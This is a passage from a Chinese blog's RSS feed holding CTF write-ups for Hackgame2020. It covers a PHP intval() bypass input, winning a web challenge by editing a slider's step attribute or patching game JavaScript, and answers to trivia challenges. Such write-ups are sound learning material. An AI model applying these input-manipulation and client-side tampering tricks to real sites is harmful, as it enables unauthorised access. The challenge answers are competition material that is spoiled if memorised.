+&lt;/code>&lt;/pre>&lt;p>&lt;strong>第一关&lt;/strong>利用intval()函数特性：直到遇上数字或正负符号才开始做转换。所以构造&lt;code>num=202020020a&lt;/code>，即可。&lt;/p></description></item><item><title>Hackgame2020(一)</title><link>/posts/ctf/hackgame20201/</link><pubDate>Sun, 01 Nov 2020 18:33:40 +0000</pubDate><guid>/posts/ctf/hackgame20201/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>比赛地址：https://hack.lug.ustc.edu.cn/&lt;/p>
+&lt;h1 id="web">web&lt;/h1>
+&lt;h3 id="签到题">签到题&lt;/h3>
+&lt;p>​	第一题是flag提取器，打开题目以后页面是一个提取器下面一个&lt;code>进度条&lt;/code>和一个&lt;code>提取&lt;/code>按钮。&lt;/p>
+&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwJbJs.png" alt="BwJbJs.png">&lt;/p>
+&lt;p>​	随便拉了拉进度条发现初始是&lt;code>0&lt;/code>末尾是&lt;code>1.5&lt;/code>，然后中间的数值都是小数&lt;/p>
+&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwYAQx.png" alt="BwYAQx.png">&lt;/p>
+&lt;p>​	我猜的题目可能是想让数值为&lt;code>1&lt;/code>时能提取到flag。&lt;/p>
+&lt;p>​	F12查看源代码，定位到进度条的标签，查看属性&lt;/p>
+&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwYoX6.png" alt="">&lt;/p>
+&lt;p>​	确实和猜测一样最大最小值分别是&lt;code>0&lt;/code>、&lt;code>1.5&lt;/code>，注意到&lt;code>step&lt;/code>值为&lt;code>0.00001&lt;/code>，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到&lt;code>1&lt;/code>个flag，就把网页上的&lt;code>step&lt;/code>值改为&lt;code>1&lt;/code>。然后随便拖动一下进度条得到&lt;code>1&lt;/code>，点击&lt;code>提取&lt;/code>按钮，完工。&lt;/p>
+&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwNVaD.png" alt="">&lt;/p>
+&lt;h3 id="2048">2048&lt;/h3>
+&lt;p>​	打开题目是一个&lt;code>2048&lt;/code>的小游戏，第一个想法就是玩&lt;code>2048&lt;/code>达到一定分数以后会获得flag（&lt;del>可恶这个比赛怎么知道最近我天天在玩2048的&lt;/del>）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种&lt;del>逃课废物&lt;/del>是不可能努力哒！&lt;/p>
+&lt;p>F12开始翻网页资源&lt;/p>
+&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwUONF.png" alt="">&lt;/p>
+&lt;p>​	还好上次&lt;del>摸鱼&lt;/del>课题做了一个网页版的2048，略微能看懂一点点结构，第一个&lt;code>animframe_polyfill&lt;/code>应该就是管动画效果的，&lt;code>keynpard...&lt;/code>这个肯定是相应按键的，&lt;code>local_storage_manager&lt;/code>应该是保存游戏的，&lt;code>game_manager&lt;/code>感觉就是管理整个游戏的主要文件。&lt;/p>
+&lt;p>​	打开&lt;code>game_manager&lt;/code>粗略的看了下变量，&lt;code>score&lt;/code> 分数、&lt;code>over、won、keepPlaying&lt;/code>游戏状态，想赢游戏肯定是和&lt;code>score、won&lt;/code>有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。&lt;/p>
+&lt;p>发现了&lt;/p>
+&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwdGdK.png" alt="">&lt;/p>
+&lt;p>​	只有这里修改了&lt;code>won&lt;/code>的状态，前面还有个&lt;code>16384&lt;/code>这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（&lt;del>小声bb&lt;/del>&lt;a href="https://s1.ax1x.com/2020/11/01/BwUdte.jpg">截图为证&lt;/a>），直接让&lt;code>if&lt;/code>里面的语句为真就可以获胜，直接修改&lt;code>if(1) self.won = true&lt;/code>，保存文件，按一个方向键让语句执行到，完工。&lt;/p>
+&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwwpTK.png" alt="">&lt;/p>
+&lt;h1 id="general">general&lt;/h1>
+&lt;h3 id="猫咪问题">猫咪问题++&lt;/h3>
+&lt;p>​	秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解&lt;/p>
+&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwLtDs.png" alt="">&lt;/p>
+&lt;p>​	题意思很明显的书考验同学的搜题技巧。那就开工。&lt;/p>
+&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwLD8U.png" alt="">&lt;/p>
+&lt;h4 id="第一题">第一题&lt;/h4>
+&lt;blockquote>
+&lt;ol>
+&lt;li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？&lt;/li>
+&lt;/ol>
+&lt;p>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.&lt;/p>
+&lt;p>提示：学术上一般认为龙不属于哺乳动物。&lt;/p>
+&lt;/blockquote>
+&lt;p>​	本人只认识几个，那就一个一个搜呗。我的模式是：百度&lt;code>xxx标志&lt;/code>然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度&lt;code>xxx是哺乳动物吗&lt;/code>，妥妥的&lt;del>胎儿&lt;/del>教学。&lt;/p>
+&lt;p>​	一个比较有印象就是&lt;code>FreeDOS&lt;/code>这个标志就离谱，什么玩意&lt;/p>
+&lt;p>&lt;img src="https://src.onlinedown.net/supply/sup_logo/logo-1122/46778_g.jpg" alt="">&lt;/p>
+&lt;p>&lt;strong>参考答案 ：12&lt;/strong>&lt;/p>
+&lt;h4 id="第二题">第二题&lt;/h4>
+&lt;blockquote>
+&lt;ol start="2">
+&lt;li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？&lt;/li>
+&lt;/ol>
+&lt;/blockquote>
+&lt;p>​	卡了我好一会，没听过信鸽传输，贴上最后找到答案的&lt;a href="https://blog.csdn.net/qq_31621387/article/details/77690642">博客&lt;/a>，以及一篇信鸽传输的&lt;a href="http://sohu.com/a/309403082_354973">历史发展&lt;/a>，长见识了。&lt;/p></description></item></channel></rss>
